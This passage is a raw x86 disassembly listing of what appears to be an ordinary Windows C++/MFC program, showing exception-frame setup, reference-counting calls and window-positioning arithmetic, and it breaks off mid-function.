  403903:	8b 44 24 08          	mov    0x8(%esp),%eax
  403907:	8b 4e 04             	mov    0x4(%esi),%ecx
  40390a:	50                   	push   %eax
  40390b:	6a 10                	push   $0x10
  40390d:	6a 00                	push   $0x0
  40390f:	51                   	push   %ecx
  403910:	ff d7                	call   *%edi
  403912:	5f                   	pop    %edi
  403913:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403917:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  40391e:	ff 
  40391f:	e8 e0 0c 00 00       	call   0x404604
  403924:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403928:	b8 01 00 00 00       	mov    $0x1,%eax
  40392d:	5e                   	pop    %esi
  40392e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403935:	83 c4 10             	add    $0x10,%esp
  403938:	c3                   	ret
  403939:	90                   	nop
  40393a:	90                   	nop
  40393b:	90                   	nop
  40393c:	90                   	nop
  40393d:	90                   	nop
  40393e:	90                   	nop
  40393f:	90                   	nop
  403940:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403946:	6a ff                	push   $0xffffffff
  403948:	68 58 52 40 00       	push   $0x405258
  40394d:	50                   	push   %eax
  40394e:	8b 44 24 10          	mov    0x10(%esp),%eax
  403952:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403959:	25 f0 ff 00 00       	and    $0xfff0,%eax
  40395e:	83 ec 60             	sub    $0x60,%esp
  403961:	83 f8 10             	cmp    $0x10,%eax
  403964:	75 3c                	jne    0x4039a2
  403966:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  40396a:	e8 c1 f6 ff ff       	call   0x403030
  40396f:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  403973:	c7 44 24 68 00 00 00 	movl   $0x0,0x68(%esp)
  40397a:	00 
  40397b:	e8 8e 0b 00 00       	call   0x40450e
  403980:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  403984:	c7 44 24 68 ff ff ff 	movl   $0xffffffff,0x68(%esp)
  40398b:	ff 
  40398c:	e8 79 0c 00 00       	call   0x40460a
  403991:	8b 4c 24 60          	mov    0x60(%esp),%ecx
  403995:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40399c:	83 c4 6c             	add    $0x6c,%esp
  40399f:	c2 08 00             	ret    $0x8
  4039a2:	e8 5b 0e 00 00       	call   0x404802
  4039a7:	8b 4c 24 60          	mov    0x60(%esp),%ecx
  4039ab:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4039b2:	83 c4 6c             	add    $0x6c,%esp
  4039b5:	c2 08 00             	ret    $0x8
  4039b8:	90                   	nop
  4039b9:	90                   	nop
  4039ba:	90                   	nop
  4039bb:	90                   	nop
  4039bc:	90                   	nop
  4039bd:	90                   	nop
  4039be:	90                   	nop
  4039bf:	90                   	nop
  4039c0:	83 ec 64             	sub    $0x64,%esp
  4039c3:	56                   	push   %esi
  4039c4:	8b f1                	mov    %ecx,%esi
  4039c6:	8b 46 20             	mov    0x20(%esi),%eax
  4039c9:	50                   	push   %eax
  4039ca:	ff 15 40 63 40 00    	call   *0x406340
  4039d0:	85 c0                	test   %eax,%eax
  4039d2:	0f 84 8f 00 00 00    	je     0x403a67
  4039d8:	53                   	push   %ebx
  4039d9:	57                   	push   %edi
  4039da:	56                   	push   %esi
  4039db:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  4039df:	e8 2a 0e 00 00       	call   0x40480e
  4039e4:	8b 7c 24 20          	mov    0x20(%esp),%edi
  4039e8:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4039ec:	8b 4e 20             	mov    0x20(%esi),%ecx
  4039ef:	6a 00                	push   $0x0
  4039f1:	f7 d8                	neg    %eax
  4039f3:	1b c0                	sbb    %eax,%eax
  4039f5:	23 c7                	and    %edi,%eax
  4039f7:	50                   	push   %eax
  4039f8:	6a 27                	push   $0x27
  4039fa:	51                   	push   %ecx
  4039fb:	ff 15 34 63 40 00    	call   *0x406334
  403a01:	8b 3d 3c 63 40 00    	mov    0x40633c,%edi
  403a07:	6a 0b                	push   $0xb
  403a09:	ff d7                	call   *%edi
  403a0b:	6a 0c                	push   $0xc
  403a0d:	8b d8                	mov    %eax,%ebx
  403a0f:	ff d7                	call   *%edi
  403a11:	8b f8                	mov    %eax,%edi
  403a13:	8b 46 20             	mov    0x20(%esi),%eax
  403a16:	8d 54 24 0c          	lea    0xc(%esp),%edx
  403a1a:	52                   	push   %edx
  403a1b:	50                   	push   %eax
  403a1c:	ff 15 24 63 40 00    	call   *0x406324
  403a22:	8b 4e 64             	mov    0x64(%esi),%ecx
  403a25:	8b 44 24 18          	mov    0x18(%esp),%eax
  403a29:	51                   	push   %ecx
  403a2a:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403a2e:	2b c1                	sub    %ecx,%eax
  403a30:	2b c7                	sub    %edi,%eax
  403a32:	40                   	inc    %eax
  403a33:	99                   	cltd
  403a34:	2b c2                	sub    %edx,%eax
  403a36:	8b 54 24 10          	mov    0x10(%esp),%edx
  403a3a:	d1 f8                	sar    $1,%eax
  403a3c:	50                   	push   %eax
  403a3d:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403a41:	2b c2                	sub    %edx,%eax
  403a43:	2b c3                	sub    %ebx,%eax
  403a45:	40                   	inc    %eax
  403a46:	99                   	cltd
  403a47:	2b c2                	sub    %edx,%eax
  403a49:	8b 54 24 28          	mov    0x28(%esp),%edx
  403a4d:	d1 f8                	sar    $1,%eax
  403a4f:	50                   	push   %eax
  403a50:	52                   	push   %edx
  403a51:	ff 15 20 63 40 00    	call   *0x406320
  403a57:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  403a5b:	e8 a8 0d 00 00       	call   0x404808
  403a60:	5f                   	pop    %edi
  403a61:	5b                   	pop    %ebx
  403a62:	5e                   	pop    %esi
  403a63:	83 c4 64             	add    $0x64,%esp
  403a66:	c3                   	ret
  403a67:	8b ce                	mov    %esi,%ecx
  403a69:	e8 94 0d 00 00       	call   0x404802
  403a6e:	5e                   	pop    %esi
  403a6f:	83 c4 64             	add    $0x64,%esp
  403a72:	c3                   	ret
  403a73:	90                   	nop
  403a74:	90                   	nop
  403a75:	90                   	nop
  403a76:	90                   	nop
  403a77:	90                   	nop
  403a78:	90                   	nop
  403a79:	90                   	nop
  403a7a:	90                   	nop
  403a7b:	90                   	nop
  403a7c:	90                   	nop
  403a7d:	90                   	nop
  403a7e:	90                   	nop
  403a7f:	90                   	nop
  403a80:	8b 41 64             	mov    0x64(%ecx),%eax
  403a83:	c3                   	ret
  403a84:	90                   	nop
  403a85:	90                   	nop
  403a86:	90                   	nop
  403a87:	90                   	nop
  403a88:	90                   	nop
  403a89:	90                   	nop
  403a8a:	90                   	nop
  403a8b:	90                   	nop
  403a8c:	90                   	nop
  403a8d:	90                   	nop
  403a8e:	90                   	nop
  403a8f:	90                   	nop
  403a90:	56                   	push   %esi
  403a91:	8b f1                	mov    %ecx,%esi
  403a93:	e8 58 00 00 00       	call   0x403af0
  403a98:	85 c0                	test   %eax,%eax
  403a9a:	74 07                	je     0x403aa3
  403a9c:	8b ce                	mov    %esi,%ecx
  403a9e:	e8 5f 0d 00 00       	call   0x404802
  403aa3:	5e                   	pop    %esi
  403aa4:	c3                   	ret
  403aa5:	90                   	nop
  403aa6:	90                   	nop
  403aa7:	90                   	nop
  403aa8:	90                   	nop
  403aa9:	90                   	nop
  403aaa:	90                   	nop
  403aab:	90                   	nop
  403aac:	90                   	nop
  403aad:	90                   	nop
  403aae:	90                   	nop
  403aaf:	90                   	nop
  403ab0:	56                   	push   %esi
  403ab1:	8b f1                	mov    %ecx,%esi
  403ab3:	e8 38 00 00 00       	call   0x403af0
  403ab8:	85 c0                	test   %eax,%eax
  403aba:	74 07                	je     0x403ac3
  403abc:	8b ce                	mov    %esi,%ecx
  403abe:	e8 39 0a 00 00       	call   0x4044fc
  403ac3:	5e                   	pop    %esi
  403ac4:	c3                   	ret
  403ac5:	90                   	nop
  403ac6:	90                   	nop
  403ac7:	90                   	nop
  403ac8:	90                   	nop
  403ac9:	90                   	nop
  403aca:	90                   	nop
  403acb:	90                   	nop
  403acc:	90                   	nop
  403acd:	90                   	nop
  403ace:	90                   	nop
  403acf:	90                   	nop
  403ad0:	56                   	push   %esi
  403ad1:	8b f1                	mov    %ecx,%esi
  403ad3:	e8 18 00 00 00       	call   0x403af0
  403ad8:	85 c0                	test   %eax,%eax
  403ada:	74 07                	je     0x403ae3
  403adc:	8b ce                	mov    %esi,%ecx
  403ade:	e8 13 0a 00 00       	call   0x4044f6
  403ae3:	5e                   	pop    %esi
  403ae4:	c3                   	ret
  403ae5:	90                   	nop
  403ae6:	90                   	nop
  403ae7:	90                   	nop
  403ae8:	90                   	nop
  403ae9:	90                   	nop
  403aea:	90                   	nop
  403aeb:	90                   	nop
  403aec:	90                   	nop
  403aed:	90                   	nop
  403aee:	90                   	nop
  403aef:	90                   	nop
  403af0:	8b 41 60             	mov    0x60(%ecx),%eax
  403af3:	85 c0                	test   %eax,%eax
  403af5:	74 0a                	je     0x403b01
  403af7:	6a 00                	push   $0x0
  403af9:	e8 16 0d 00 00       	call   0x404814
  403afe:	33 c0                	xor    %eax,%eax
  403b00:	c3                   	ret
  403b01:	b8 01 00 00 00       	mov    $0x1,%eax
  403b06:	c3                   	ret
  403b07:	90                   	nop
  403b08:	90                   	nop
  403b09:	90                   	nop
  403b0a:	90                   	nop
  403b0b:	90                   	nop
  403b0c:	90                   	nop
  403b0d:	90                   	nop
  403b0e:	90                   	nop
  403b0f:	90                   	nop
  403b10:	6a ff                	push   $0xffffffff
  403b12:	68 78 52 40 00       	push   $0x405278
  403b17:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403b1d:	50                   	push   %eax
  403b1e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403b25:	83 ec 60             	sub    $0x60,%esp
  403b28:	56                   	push   %esi
  403b29:	8b f1                	mov    %ecx,%esi
  403b2b:	6a 00                	push   $0x0
  403b2d:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403b31:	e8 6a f3 ff ff       	call   0x402ea0
  403b36:	6a 00                	push   $0x0
  403b38:	8b ce                	mov    %esi,%ecx
  403b3a:	c7 44 24 70 00 00 00 	movl   $0x0,0x70(%esp)
  403b41:	00 
  403b42:	e8 cd 0c 00 00       	call   0x404814
  403b47:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403b4b:	e8 be 09 00 00       	call   0x40450e
  403b50:	6a 05                	push   $0x5
  403b52:	8b ce                	mov    %esi,%ecx
  403b54:	e8 bb 0c 00 00       	call   0x404814
  403b59:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403b5d:	c7 44 24 6c ff ff ff 	movl   $0xffffffff,0x6c(%esp)
  403b64:	ff 
  403b65:	e8 a0 0a 00 00       	call   0x40460a
  403b6a:	8b 4c 24 64          	mov    0x64(%esp),%ecx
  403b6e:	5e                   	pop    %esi
  403b6f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403b76:	83 c4 6c             	add    $0x6c,%esp
  403b79:	c3                   	ret
  403b7a:	90                   	nop
  403b7b:	90                   	nop
  403b7c:	90                   	nop
  403b7d:	90                   	nop
  403b7e:	90                   	nop
  403b7f:	90                   	nop
  403b80:	6a ff                	push   $0xffffffff
  403b82:	68 ce 52 40 00       	push   $0x4052ce
  403b87:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403b8d:	50                   	push   %eax
  403b8e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403b95:	81 ec bc 00 00 00    	sub    $0xbc,%esp
  403b9b:	56                   	push   %esi
  403b9c:	8b f1                	mov    %ecx,%esi
  403b9e:	6a 00                	push   $0x0
  403ba0:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403ba4:	e8 a7 e7 ff ff       	call   0x402350
  403ba9:	6a 00                	push   $0x0
  403bab:	8b ce                	mov    %esi,%ecx
  403bad:	c7 84 24 cc 00 00 00 	movl   $0x0,0xcc(%esp)
  403bb4:	00 00 00 00 
  403bb8:	e8 57 0c 00 00       	call   0x404814
  403bbd:	8b 46 68             	mov    0x68(%esi),%eax
  403bc0:	51                   	push   %ecx
  403bc1:	8b cc                	mov    %esp,%ecx
  403bc3:	89 64 24 08          	mov    %esp,0x8(%esp)
  403bc7:	85 c0                	test   %eax,%eax
  403bc9:	89 01                	mov    %eax,(%ecx)
  403bcb:	74 06                	je     0x403bd3
  403bcd:	8b 08                	mov    (%eax),%ecx
  403bcf:	50                   	push   %eax
  403bd0:	ff 51 04             	call   *0x4(%ecx)
  403bd3:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403bd7:	e8 c4 00 00 00       	call   0x403ca0
  403bdc:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403be0:	e8 29 09 00 00       	call   0x40450e
  403be5:	6a 05                	push   $0x5
  403be7:	8b ce                	mov    %esi,%ecx
  403be9:	e8 26 0c 00 00       	call   0x404814
  403bee:	8b 84 24 bc 00 00 00 	mov    0xbc(%esp),%eax
  403bf5:	c7 84 24 c8 00 00 00 	movl   $0x6,0xc8(%esp)
  403bfc:	06 00 00 00 
  403c00:	85 c0                	test   %eax,%eax
  403c02:	74 06                	je     0x403c0a
  403c04:	8b 10                	mov    (%eax),%edx
  403c06:	50                   	push   %eax
  403c07:	ff 52 08             	call   *0x8(%edx)
  403c0a:	8d 8c 24 b4 00 00 00 	lea    0xb4(%esp),%ecx
  403c11:	c6 84 24 c8 00 00 00 	movb   $0x5,0xc8(%esp)
  403c18:	05 
  403c19:	e8 e6 09 00 00       	call   0x404604
  403c1e:	8d 8c 24 b0 00 00 00 	lea    0xb0(%esp),%ecx
  403c25:	c6 84 24 c8 00 00 00 	movb   $0x4,0xc8(%esp)
  403c2c:	04 
  403c2d:	e8 d2 09 00 00       	call   0x404604
  403c32:	8d 8c 24 ac 00 00 00 	lea    0xac(%esp),%ecx
  403c39:	c6 84 24 c8 00 00 00 	movb   $0x3,0xc8(%esp)
  403c40:	03 
  403c41:	e8 be 09 00 00       	call   0x404604
  403c46:	8d 8c 24 a8 00 00 00 	lea    0xa8(%esp),%ecx
  403c4d:	c6 84 24 c8 00 00 00 	movb   $0x2,0xc8(%esp)
  403c54:	02 
  403c55:	e8 aa 09 00 00       	call   0x404604
  403c5a:	8d 4c 24 68          	lea    0x68(%esp),%ecx
  403c5e:	c6 84 24 c8 00 00 00 	movb   $0x1,0xc8(%esp)
  403c65:	01 
  403c66:	e8 29 0a 00 00       	call   0x404694
  403c6b:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403c6f:	c7 84 24 c8 00 00 00 	movl   $0xffffffff,0xc8(%esp)
  403c76:	ff ff ff ff 
  403c7a:	e8 8b 09 00 00       	call   0x40460a
  403c7f:	8b 8c 24 c0 00 00 00 	mov    0xc0(%esp),%ecx
  403c86:	5e                   	pop    %esi
  403c87:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403c8e:	81 c4 c8 00 00 00    	add    $0xc8,%esp
  403c94:	c3                   	ret
  403c95:	90                   	nop
  403c96:	90                   	nop
  403c97:	90                   	nop
  403c98:	90                   	nop
  403c99:	90                   	nop
  403c9a:	90                   	nop
  403c9b:	90                   	nop
  403c9c:	90                   	nop
  403c9d:	90                   	nop
  403c9e:	90                   	nop
  403c9f:	90                   	nop
  403ca0:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403ca6:	6a ff                	push   $0xffffffff
  403ca8:	68 e8 52 40 00       	push   $0x4052e8
  403cad:	50                   	push   %eax
  403cae:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403cb5:	56                   	push   %esi
  403cb6:	57                   	push   %edi
  403cb7:	8b b9 b4 00 00 00    	mov    0xb4(%ecx),%edi
  403cbd:	8b 74 24 18          	mov    0x18(%esp),%esi
  403cc1:	3b fe                	cmp    %esi,%edi
  403cc3:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  403cca:	00 
  403ccb:	74 1a                	je     0x403ce7
  403ccd:	85 f6                	test   %esi,%esi
  403ccf:	89 b1 b4 00 00 00    	mov    %esi,0xb4(%ecx)
  403cd5:	74 06                	je     0x403cdd
  403cd7:	8b 06                	mov    (%esi),%eax
  403cd9:	56                   	push   %esi
  403cda:	ff 50 04             	call   *0x4(%eax)
  403cdd:	85 ff                	test   %edi,%edi
  403cdf:	74 06                	je     0x403ce7
  403ce1:	8b 0f                	mov    (%edi),%ecx
  403ce3:	57                   	push   %edi
  403ce4:	ff 51 08             	call   *0x8(%ecx)
  403ce7:	85 f6                	test   %esi,%esi
  403ce9:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  403cf0:	ff 
  403cf1:	74 06                	je     0x403cf9
  403cf3:	8b 16                	mov    (%esi),%edx
  403cf5:	56                   	push   %esi
  403cf6:	ff 52 08             	call   *0x8(%edx)
  403cf9:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403cfd:	5f                   	pop    %edi
  403cfe:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403d05:	5e                   	pop    %esi
  403d06:	83 c4 0c             	add    $0xc,%esp
  403d09:	c2 04 00             	ret    $0x4
  403d0c:	90                   	nop
  403d0d:	90                   	nop
  403d0e:	90                   	nop
  403d0f:	90                   	nop
  403d10:	6a ff                	push   $0xffffffff
  403d12:	68 4e 53 40 00       	push   $0x40534e
  403d17:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403d1d:	50                   	push   %eax
  403d1e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403d25:	81 ec c4 00 00 00    	sub    $0xc4,%esp
  403d2b:	56                   	push   %esi
  403d2c:	8b f1                	mov    %ecx,%esi
  403d2e:	6a 00                	push   $0x0
  403d30:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403d34:	e8 b7 ec ff ff       	call   0x4029f0
  403d39:	6a 00                	push   $0x0
  403d3b:	8b ce                	mov    %esi,%ecx
  403d3d:	c7 84 24 d4 00 00 00 	movl   $0x0,0xd4(%esp)
  403d44:	00 00 00 00 
  403d48:	e8 c7 0a 00 00       	call   0x404814
  403d4d:	8b 46 68             	mov    0x68(%esi),%eax
  403d50:	51                   	push   %ecx
  403d51:	8b cc                	mov    %esp,%ecx
  403d53:	89 64 24 08          	mov    %esp,0x8(%esp)
  403d57:	85 c0                	test   %eax,%eax
  403d59:	89 01                	mov    %eax,(%ecx)
  403d5b:	74 06                	je     0x403d63
  403d5d:	8b 08                	mov    (%eax),%ecx
  403d5f:	50                   	push   %eax
  403d60:	ff 51 04             	call   *0x4(%ecx)
  403d63:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403d67:	e8 e4 00 00 00       	call   0x403e50
  403d6c:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403d70:	e8 99 07 00 00       	call   0x40450e
  403d75:	6a 05                	push   $0x5
  403d77:	8b ce                	mov    %esi,%ecx
  403d79:	e8 96 0a 00 00       	call   0x404814
  403d7e:	8b 84 24 c4 00 00 00 	mov    0xc4(%esp),%eax
  403d85:	c7 84 24 d0 00 00 00 	movl   $0x8,0xd0(%esp)
  403d8c:	08 00 00 00 
  403d90:	85 c0                	test   %eax,%eax
  403d92:	74 06                	je     0x403d9a
  403d94:	8b 10                	mov    (%eax),%edx
  403d96:	50                   	push   %eax
  403d97:	ff 52 08             	call   *0x8(%edx)
  403d9a:	8d 8c 24 bc 00 00 00 	lea    0xbc(%esp),%ecx
  403da1:	c6 84 24 d0 00 00 00 	movb   $0x7,0xd0(%esp)
  403da8:	07 
  403da9:	e8 56 08 00 00       	call   0x404604
  403dae:	8d 8c 24 b8 00 00 00 	lea    0xb8(%esp),%ecx
  403db5:	c6 84 24 d0 00 00 00 	movb   $0x6,0xd0(%esp)
  403dbc:	06 
  403dbd:	e8 42 08 00 00       	call   0x404604
  403dc2:	8d 8c 24 b4 00 00 00 	lea    0xb4(%esp),%ecx
  403dc9:	c6 84 24 d0 00 00 00 	movb   $0x5,0xd0(%esp)
  403dd0:	05 
  403dd1:	e8 2e 08 00 00       	call   0x404604
  403dd6:	8d 8c 24 b0 00 00 00 	lea    0xb0(%esp),%ecx
  403ddd:	c6 84 24 d0 00 00 00 	movb   $0x4,0xd0(%esp)
  403de4:	04 
  403de5:	e8 1a 08 00 00       	call   0x404604
  403dea:	8d 8c 24 ac 00 00 00 	lea    0xac(%esp),%ecx
  403df1:	c6 84 24 d0 00 00 00 	movb   $0x3,0xd0(%esp)
  403df8:	03 
  403df9:	e8 06 08 00 00       	call   0x404604
  403dfe:	8d 8c 24 a8 00 00 00 	lea    0xa8(%esp),%ecx
  403e05:	c6 84 24 d0 00 00 00 	movb   $0x2,0xd0(%esp)
  403e0c:	02 
  403e0d:	e8 f2 07 00 00       	call   0x404604
  403e12:	8d 4c 24 68          	lea    0x68(%esp),%ecx
  403e16:	c6 84 24 d0 00 00 00 	movb   $0x1,0xd0(%esp)
  403e1d:	01 
  403e1e:	e8 71 08 00 00       	call   0x404694
  403e23:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403e27:	c7 84 24 d0 00 00 00 	movl   $0xffffffff,0xd0(%esp)
  403e2e:	ff ff ff ff 
  403e32:	e8 d3 07 00 00       	call   0x40460a
  403e37:	8b 8c 24 c8 00 00 00 	mov    0xc8(%esp),%ecx
  403e3e:	5e                   	pop    %esi
  403e3f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403e46:	81 c4 d0 00 00 00    	add    $0xd0,%esp
  403e4c:	c3                   	ret
  403e4d:	90                   	nop
  403e4e:	90                   	nop
  403e4f:	90                   	nop
  403e50:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403e56:	6a ff                	push   $0xffffffff
  403e58:	68 68 53 40 00       	push   $0x405368
  403e5d:	50                   	push   %eax
  403e5e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403e65:	56                   	push   %esi
  403e66:	57                   	push   %edi
  403e67:	8b b9 bc 00 00 00    	mov    0xbc(%ecx),%edi
  403e6d:	8b 74 24 18          	mov    0x18(%esp),%esi
  403e71:	3b fe                	cmp    %esi,%edi
  403e73:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  403e7a:	00 
  403e7b:	74 1a                	je     0x403e97
  403e7d:	85 f6                	test   %esi,%esi
  403e7f:	89 b1 bc 00 00 00    	mov    %esi,0xbc(%ecx)
  403e85:	74 06                	je     0x403e8d
  403e87:	8b 06                	mov    (%esi),%eax
  403e89:	56                   	push   %esi
  403e8a:	ff 50 04             	call   *0x4(%eax)
  403e8d:	85 ff                	test   %edi,%edi
  403e8f:	74 06                	je     0x403e97
  403e91:	8b 0f                	mov    (%edi),%ecx
  403e93:	57                   	push   %edi
  403e94:	ff 51 08             	call   *0x8(%ecx)
  403e97:	85 f6                	test   %esi,%esi
  403e99:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  403ea0:	ff 
  403ea1:	74 06                	je     0x403ea9
  403ea3:	8b 16                	mov    (%esi),%edx
  403ea5:	56                   	push   %esi
  403ea6:	ff 52 08             	call   *0x8(%edx)
  403ea9:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403ead:	5f                   	pop    %edi
  403eae:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403eb5:	5e                   	pop    %esi
  403eb6:	83 c4 0c             	add    $0xc,%esp
  403eb9:	c2 04 00             	ret    $0x4
  403ebc:	90                   	nop
  403ebd:	90                   	nop
  403ebe:	90                   	nop
  403ebf:	90                   	nop
  403ec0:	6a ff                	push   $0xffffffff
  403ec2:	68 b9 53 40 00       	push   $0x4053b9
  403ec7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403ecd:	50                   	push   %eax
  403ece:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403ed5:	81 ec f8 00 00 00    	sub    $0xf8,%esp
  403edb:	56                   	push   %esi
  403edc:	8b f1                	mov    %ecx,%esi
  403ede:	6a 00                	push   $0x0
  403ee0:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403ee4:	e8 e7 d3 ff ff       	call   0x4012d0
  403ee9:	6a 00                	push   $0x0
  403eeb:	8b ce                	mov    %esi,%ecx
  403eed:	c7 84 24 08 01 00 00 	movl   $0x0,0x108(%esp)
  403ef4:	00 00 00 00 
  403ef8:	e8 17 09 00 00       	call   0x404814
  403efd:	8b 46 68             	mov    0x68(%esi),%eax
  403f00:	51                   	push   %ecx
  403f01:	8b cc                	mov    %esp,%ecx
  403f03:	89 64 24 08          	mov    %esp,0x8(%esp)
  403f07:	85 c0                	test   %eax,%eax
  403f09:	89 01                	mov    %eax,(%ecx)
  403f0b:	74 06                	je     0x403f13
  403f0d:	8b 08                	mov    (%eax),%ecx
  403f0f:	50                   	push   %eax
  403f10:	ff 51 04             	call   *0x4(%ecx)
  403f13:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403f17:	e8 b4 00 00 00       	call   0x403fd0
  403f1c:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403f20:	e8 e9 05 00 00       	call   0x40450e
  403f25:	6a 05                	push   $0x5
  403f27:	8b ce                	mov    %esi,%ecx
  403f29:	e8 e6 08 00 00       	call   0x404814
  403f2e:	8b 84 24 f8 00 00 00 	mov    0xf8(%esp),%eax
  403f35:	c7 84 24 04 01 00 00 	movl   $0x5,0x104(%esp)
  403f3c:	05 00 00 00 
  403f40:	85 c0                	test   %eax,%eax
  403f42:	74 06                	je     0x403f4a
  403f44:	8b 10                	mov    (%eax),%edx
  403f46:	50                   	push   %eax
  403f47:	ff 52 08             	call   *0x8(%edx)
  403f4a:	8d 8c 24 f4 00 00 00 	lea    0xf4(%esp),%ecx
  403f51:	c6 84 24 04 01 00 00 	movb   $0x4,0x104(%esp)
  403f58:	04 
  403f59:	e8 a6 06 00 00       	call   0x404604
  403f5e:	8d 8c 24 ec 00 00 00 	lea    0xec(%esp),%ecx
  403f65:	c6 84 24 04 01 00 00 	movb   $0x3,0x104(%esp)
  403f6c:	03 
  403f6d:	e8 92 06 00 00       	call   0x404604
  403f72:	8d 8c 24 a8 00 00 00 	lea    0xa8(%esp),%ecx
  403f79:	c6 84 24 04 01 00 00 	movb   $0x2,0x104(%esp)
  403f80:	02 
  403f81:	e8 0e 07 00 00       	call   0x404694
  403f86:	8d 4c 24 68          	lea    0x68(%esp),%ecx
  403f8a:	c6 84 24 04 01 00 00 	movb   $0x1,0x104(%esp)
  403f91:	01 
  403f92:	e8 03 07 00 00       	call   0x40469a
  403f97:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403f9b:	c7 84 24 04 01 00 00 	movl   $0xffffffff,0x104(%esp)
  403fa2:	ff ff ff ff 
  403fa6:	e8 5f 06 00 00       	call   0x40460a
  403fab:	8b 8c 24 fc 00 00 00 	mov    0xfc(%esp),%ecx
  403fb2:	5e                   	pop    %esi
  403fb3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403fba:	81 c4 04 01 00 00    	add    $0x104,%esp
  403fc0:	c3                   	ret
  403fc1:	90                   	nop
  403fc2:	90                   	nop
  403fc3:	90                   	nop
  403fc4:	90                   	nop
  403fc5:	90                   	nop
  403fc6:	90                   	nop
  403fc7:	90                   	nop
  403fc8:	90                   	nop
  403fc9:	90                   	nop
  403fca:	90                   	nop
  403fcb:	90                   	nop
  403fcc:	90                   	nop
  403fcd:	90                   	nop
  403fce:	90                   	nop
  403fcf:	90                   	nop
  403fd0:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403fd6:	6a ff                	push   $0xffffffff
  403fd8:	68 d8 53 40 00       	push   $0x4053d8
  403fdd:	50                   	push   %eax
  403fde:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403fe5:	56                   	push   %esi
  403fe6:	57                   	push   %edi
  403fe7:	8b b9 f0 00 00 00    	mov    0xf0(%ecx),%edi
  403fed:	8b 74 24 18          	mov    0x18(%esp),%esi
  403ff1:	3b fe                	cmp    %esi,%edi
  403ff3:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  403ffa:	00 
  403ffb:	74 1a                	je     0x404017
  403ffd:	85 f6                	test   %esi,%esi
  403fff:	89 b1 f0 00 00 00    	mov    %esi,0xf0(%ecx)
  404005:	74 06                	je     0x40400d
  404007:	8b 06                	mov    (%esi),%eax
  404009:	56                   	push   %esi
  40400a:	ff 50 04             	call   *0x4(%eax)
  40400d:	85 ff                	test   %edi,%edi
  40400f:	74 06                	je     0x404017
  404011:	8b 0f                	mov    (%edi),%ecx
  404013:	57                   	push   %edi
  404014:	ff 51 08             	call   *0x8(%ecx)
  404017:	85 f6                	test   %esi,%esi
  404019:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  404020:	ff 
  404021:	74 06                	je     0x404029
  404023:	8b 16                	mov    (%esi),%edx
  404025:	56                   	push   %esi
  404026:	ff 52 08             	call   *0x8(%edx)
  404029:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40402d:	5f                   	pop    %edi
  40402e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404035:	5e                   	pop    %esi
  404036:	83 c4 0c             	add    $0xc,%esp
  404039:	c2 04 00             	ret    $0x4
  40403c:	90                   	nop
  40403d:	90                   	nop
  40403e:	90                   	nop
  40403f:	90                   	nop
  404040:	6a ff                	push   $0xffffffff
  404042:	68 36 54 40 00       	push   $0x405436
  404047:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40404d:	50                   	push   %eax
